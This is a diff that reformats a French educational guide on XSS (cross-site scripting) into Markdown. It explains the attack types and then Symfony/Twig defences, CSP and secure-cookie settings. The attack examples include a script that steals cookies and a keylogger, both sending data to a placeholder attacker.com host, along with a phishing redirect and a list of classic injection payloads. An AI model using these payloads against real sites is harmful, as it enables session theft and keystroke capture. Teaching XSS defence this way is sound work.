@@ -1,8 +1,7 @@
-FAILLE XSS (Cross-Site Scripting)
-==================================
+# FAILLE XSS (Cross-Site Scripting)
 
-INTRODUCTION
-------------
+## INTRODUCTION
+
 La faille XSS (Cross-Site Scripting), ou injection de script intersite, est une vulnérabilité web 
 qui permet à un attaquant d'injecter du code JavaScript malveillant dans une page utilisée par 
 d'autres utilisateurs.
@@ -13,10 +12,10 @@ du site légitime.
 Ce script peut ensuite voler des informations sensibles (comme les cookies de session), rediriger 
 l'utilisateur, ou modifier l'apparence du site.
 
-________________________________________
+---
 
-FONCTIONNEMENT
---------------
+## FONCTIONNEMENT
+
 (Étape optionnelle) L'attaquant envoie un lien vers le site web ciblé
 
 1. La victime se connecte au site web ciblé
@@ -33,77 +32,92 @@ FONCTIONNEMENT
    • Rediriger vers des sites malveillants,
    • Ou injecter d'autres scripts dans le site.
 
-________________________________________
+---
 
-TYPES DE XSS
-------------
-1. XSS RÉFLÉCHI (Reflected XSS)
-   - Le script malveillant est inclus dans l'URL ou une requête
-   - Nécessite que la victime clique sur un lien piégé
-   - Non persistant (une seule exécution)
-   
-   Exemple : https://example.com/search?q=<script>alert('XSS')</script>
+## TYPES DE XSS
 
-2. XSS STOCKÉ (Stored XSS)
-   - Le script est enregistré dans la base de données
-   - S'exécute à chaque affichage de la page
-   - Plus dangereux car affecte tous les utilisateurs
-   
-   Exemple : Commentaire contenant du code JavaScript malveillant
+### 1. XSS RÉFLÉCHI (Reflected XSS)
+- Le script malveillant est inclus dans l'URL ou une requête
+- Nécessite que la victime clique sur un lien piégé
+- Non persistant (une seule exécution)
 
-3. XSS DOM-BASED
-   - Exploitation côté client uniquement
-   - Manipulation du DOM par JavaScript
-   - Le serveur n'est pas impliqué
+**Exemple :** `https://example.com/search?q=<script>alert('XSS')</script>`
 
-________________________________________
+### 2. XSS STOCKÉ (Stored XSS)
+- Le script est enregistré dans la base de données
+- S'exécute à chaque affichage de la page
+- Plus dangereux car affecte tous les utilisateurs
 
-MOYENS D'INJECTION FRÉQUENTS
-----------------------------
-• Champs de formulaire (commentaires, profils, messageries, etc.)
-• Paramètres d'URL visibles
-• Téléversement de fichiers (SVG, HTML) contenant du JS
+**Exemple :** Commentaire contenant du code JavaScript malveillant
+
+### 3. XSS DOM-BASED
+- Exploitation côté client uniquement
+- Manipulation du DOM par JavaScript
+- Le serveur n'est pas impliqué
+
+---
+
+## MOYENS D'INJECTION FRÉQUENTS
+
+• Champs de formulaire (commentaires, profils, messageries, etc.)  
+• Paramètres d'URL visibles  
+• Téléversement de fichiers (SVG, HTML) contenant du JS  
 • Widgets ou scripts tiers compromis (ex : Google Analytics)
 
 Dans tous les cas, le navigateur exécutera le code dès qu'il le considère comme faisant partie 
 du site légitime.
 
-________________________________________
+---
 
-EXEMPLES D'ATTAQUES
--------------------
-1. Vol de cookies de session :
-   <script>
-     fetch('https://attacker.com/steal?cookie=' + document.cookie);
-   </script>
+## EXEMPLES D'ATTAQUES
 
-2. Redirection malveillante :
-   <script>window.location='https://phishing-site.com';</script>
+### 1. Vol de cookies de session :
+```javascript
+<script>
+  fetch('https://attacker.com/steal?cookie=' + document.cookie);
+</script>
+```
 
-3. Keylogger :
-   <script>
-     document.addEventListener('keypress', function(e) {
-       fetch('https://attacker.com/log?key=' + e.key);
-     });
-   </script>
+### 2. Redirection malveillante :
+```javascript
+<script>window.location='https://phishing-site.com';</script>
+```
 
-4. Défacement de page :
-   <script>document.body.innerHTML='Site Hacked!';</script>
+### 3. Keylogger :
+```javascript
+<script>
+  document.addEventListener('keypress', function(e) {
+    fetch('https://attacker.com/log?key=' + e.key);
+  });
+</script>
+```
 
-5. Injection dans attribut :
-   <input value="recherche" onmouseover="alert('XSS')">
+### 4. Défacement de page :
+```javascript
+<script>document.body.innerHTML='Site Hacked!';</script>
+```
 
-VECTEURS D'INJECTION
---------------------
-- Balises script : <script>code</script>
-- Gestionnaires d'événements : <img src=x onerror="alert('XSS')">
-- Attributs HTML : <a href="javascript:alert('XSS')">
-- Styles CSS : <style>@import'http://attacker.com/malicious.css';</style>
-- Iframes : <iframe src="javascript:alert('XSS')">
-- SVG : <svg onload="alert('XSS')">
+### 5. Injection dans attribut :
+```html
+<input value="recherche" onmouseover="alert('XSS')">
+```
 
-PAYLOADS CLASSIQUES
--------------------
+---
+
+## VECTEURS D'INJECTION
+
+- Balises script : `<script>code</script>`
+- Gestionnaires d'événements : `<img src=x onerror="alert('XSS')">`
+- Attributs HTML : `<a href="javascript:alert('XSS')">`
+- Styles CSS : `<style>@import'http://attacker.com/malicious.css';</style>`
+- Iframes : `<iframe src="javascript:alert('XSS')">`
+- SVG : `<svg onload="alert('XSS')">`
+
+---
+
+## PAYLOADS CLASSIQUES
+
+```html
 <script>alert('XSS')</script>
 <img src=x onerror=alert('XSS')>
 <svg/onload=alert('XSS')>
@@ -114,60 +128,64 @@ PAYLOADS CLASSIQUES
 <textarea onfocus=alert('XSS') autofocus>
 <marquee onstart=alert('XSS')>
 <div onmouseover="alert('XSS')">
+```
 
-CONSÉQUENCES POSSIBLES
-----------------------
-• Vol de cookies ou de tokens d'authentification
-• Usurpation de session ou d'identité
-• Altération de l'affichage du site (ex. faux formulaires de connexion, modification visuelle du site)
+---
+
+## CONSÉQUENCES POSSIBLES
+
+• Vol de cookies ou de tokens d'authentification  
+• Usurpation de session ou d'identité  
+• Altération de l'affichage du site (ex. faux formulaires de connexion, modification visuelle du site)  
   - Dans certains cas, il est possible d'une propagation automatique du code XSS à d'autres pages 
-    du site, surtout en cas d'utilisation de widgets tiers compromis
-• Vol de données sensibles
-• Phishing ciblé
-• Propagation de malwares
-• Actions non autorisées au nom de l'utilisateur
+    du site, surtout en cas d'utilisation de widgets tiers compromis  
+• Vol de données sensibles  
+• Phishing ciblé  
+• Propagation de malwares  
+• Actions non autorisées au nom de l'utilisateur  
 • Installation de keyloggers
 
-________________________________________
+---
 
-PROTECTION
-----------
+## PROTECTION
+
 Plusieurs techniques permettent d'éviter les failles XSS :
 
-• Échappement systématique des caractères HTML spéciaux :
+• **Échappement systématique des caractères HTML spéciaux :**
   - Convertir <, >, ", ', & en entités HTML (&lt;, &gt;, etc.)
 
-• Validation et nettoyage des entrées utilisateurs :
-  - Refuser ou filtrer les caractères interdits, les balises <script>, les événements 
+• **Validation et nettoyage des entrées utilisateurs :**
+  - Refuser ou filtrer les caractères interdits, les balises `<script>`, les événements 
     (onload, onclick), etc.
 
-• Utilisation d'un moteur de template sécurisé :
+• **Utilisation d'un moteur de template sécurisé :**
   - Qui échappe automatiquement les variables insérées dans le HTML, comme Twig dans Symfony
 
-• Content Security Policy (CSP) :
+• **Content Security Policy (CSP) :**
   - Définir les sources autorisées pour les scripts
 
-• Cookies sécurisés :
+• **Cookies sécurisés :**
   - Utiliser les flags HTTPOnly, Secure, SameSite
 
-________________________________________
+---
 
-CAS SYMFONY
------------
+## CAS SYMFONY
+
 Symfony intègre une protection native contre les XSS à travers son moteur de templates Twig.
 
 Par défaut, Twig échappe automatiquement toutes les variables affichées dans une page HTML.
 
-Pour insérer volontairement du contenu HTML sûr, le développeur doit utiliser le filtre |raw.
+Pour insérer volontairement du contenu HTML sûr, le développeur doit utiliser le filtre `|raw`.
 • Cette opération est manuelle et consciente, afin d'éviter les erreurs involontaires.
 
 Les formulaires Symfony filtrent et valident également les entrées via le composant Validator, 
 empêchant l'injection directe de contenu non conforme ou dangereux.
 
-________________________________________
+---
 
-EXEMPLES SYMFONY / TWIG
---------------------------
+## EXEMPLES SYMFONY / TWIG
+
+```twig
 {# Twig échappe automatiquement par défaut #}
 <p>{{ user.name }}</p>  {# SÉCURISÉ #}
 
@@ -181,7 +199,9 @@ EXEMPLES SYMFONY / TWIG
 
 {# Échappement d'attribut #}
 <div data-user="{{ user.name|e('html_attr') }}">
+```
 
+```php
 // Dans un contrôleur Symfony
 use Symfony\Component\HttpFoundation\Response;
 
@@ -192,9 +212,13 @@ public function display(string $userInput): Response
         'data' => $userInput  // Sera échappé automatiquement
     ]);
 }
+```
 
-CONTENT SECURITY POLICY (CSP)
------------------------------
+---
+
+## CONTENT SECURITY POLICY (CSP)
+
+```
 // Configuration dans Symfony (config/packages/security.yaml ou middleware)
 
 Content-Security-Policy: 
@@ -203,10 +227,14 @@ Content-Security-Policy:
     style-src 'self' 'unsafe-inline'; 
     img-src 'self' data: https:;
     object-src 'none';
+```
 
 Ou via bundle :
+```bash
 composer require nelmio/security-bundle
+```
 
+```yaml
 # config/packages/nelmio_security.yaml
 nelmio_security:
     csp:
@@ -214,9 +242,13 @@ nelmio_security:
         report_uri: /csp-report
         default-src: ['self']
         script-src: ['self', 'unsafe-inline']
+```
 
-VALIDATION DES ENTRÉES
-----------------------
+---
+
+## VALIDATION DES ENTRÉES
+
+```php
 use Symfony\Component\Validator\Constraints as Assert;
 
 class CommentDTO
@@ -229,26 +261,36 @@ class CommentDTO
     )]
     private string $content;
 }
+```
 
-COOKIES SÉCURISÉS
------------------
+---
+
+## COOKIES SÉCURISÉS
+
+```yaml
 # config/packages/framework.yaml
 framework:
     session:
         cookie_secure: true
         cookie_httponly: true
         cookie_samesite: 'lax'
+```
 
-DÉTECTION ET TEST
------------------
+---
+
+## DÉTECTION ET TEST
+
 - OWASP ZAP
 - Burp Suite
 - XSS Hunter
 - Tests manuels avec payloads
 - BeEF (Browser Exploitation Framework)
 
-EXEMPLE COMPLET SÉCURISÉ
-------------------------
+---
+
+## EXEMPLE COMPLET SÉCURISÉ
+
+```php
 // Controller
 #[Route('/comment/add', methods: ['POST'])]
 public function add(Request $request, EntityManagerInterface $em): Response
@@ -267,18 +309,21 @@ public function add(Request $request, EntityManagerInterface $em): Response
     
     return $this->render('comment/add.html.twig', ['form' => $form]);
 }
+```
 
+```twig
 // Template Twig
 {# Échappement automatique #}
 <div class="comment">
     <p>{{ comment.content }}</p>
     <span>Par {{ comment.author.username }}</span>
 </div>
+```
 
-________________________________________
+---
 
-CONCLUSION
-----------
+## CONCLUSION
+
 La faille XSS repose sur la mauvaise gestion du contenu utilisateur et permet d'exécuter du 
 JavaScript malveillant dans le navigateur d'autrui.
 
@@ -286,8 +331,8 @@ Dans notre cas, grâce à Twig et à ses mécanismes d'échappement automatique,
 efficacement la plupart des tentatives XSS, tant que le développeur ne désactive pas volontairement 
 cette protection.
 
-________________________________________
+---
 
-NIVEAU DE RISQUE : ÉLEVÉ À CRITIQUE
-FACILITÉ D'EXPLOITATION : FACILE
-TOP OWASP : #7
+**NIVEAU DE RISQUE : ÉLEVÉ À CRITIQUE**  
+**FACILITÉ D'EXPLOITATION : FACILE**  
+**TOP OWASP : #7**
